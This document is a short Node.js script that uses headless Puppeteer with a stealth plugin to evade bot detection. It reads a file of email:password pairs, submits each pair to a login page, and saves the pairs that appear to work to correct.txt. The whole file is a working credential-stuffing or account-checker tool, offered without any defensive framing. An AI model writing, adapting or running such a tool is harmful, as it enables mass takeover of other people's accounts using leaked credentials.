const readline = require('readline');
const fs = require('fs')
const puppeteer = require('puppeteer-extra')
const StealthPlugin = require('puppeteer-extra-plugin-stealth')
puppeteer.use(StealthPlugin())

async function run () {  
 var inputScan = readline.createInterface({
   input: process.stdin,
   output: process.stdout
 })
 console.log("digit your list.txt: ")
 inputScan.question("DIGIT YOUR LIST.TXT: ", async function(awnser){
  var archive = fs.readFileSync(`${awnser}`, 'utf-8')
  inputScan.close()
  var lines = archive.split(/\r?\n/)
 
  
 for(let line of lines) {
    var newline = line.split(':')

    console.log(`Email: ${newline[0]}, Password: ${newline[1]}`)

    const browser = await puppeteer.launch({
            headless: true,
          });
          
          const page = await browser.newPage();
          
          await page.goto('https://example.com/login/');
          await page.waitForTimeout(1000)
          try {
          
          await page.type('[type="email"]', newline[0]) //tag contains username or email
           
          await page.type('[type="password"]', newline[1])// tag contains password

          await page.waitForTimeout(1000)
            await page.click('[type="submit"]')// tag contains button submit
            await page.waitForTimeout(1000)
          
          let error =  await page.waitForSelector('[class="ErrorOnLogin"]', {visible: true});//tag contains login error
           if (error) {
             console.log('\x1b[31m', "Credentials Error")
           }
          } catch (warning) {            
            fs.appendFile('correct.txt', `${newline[0]}, ${newline[1]}, '\n\r'`, function (err) {
              if (err) throw err;
              console.log('\x1b[32m', 'Credentials Correct!' + warning);
            })
          }
          await browser.close()
    }  
  })
}
run()
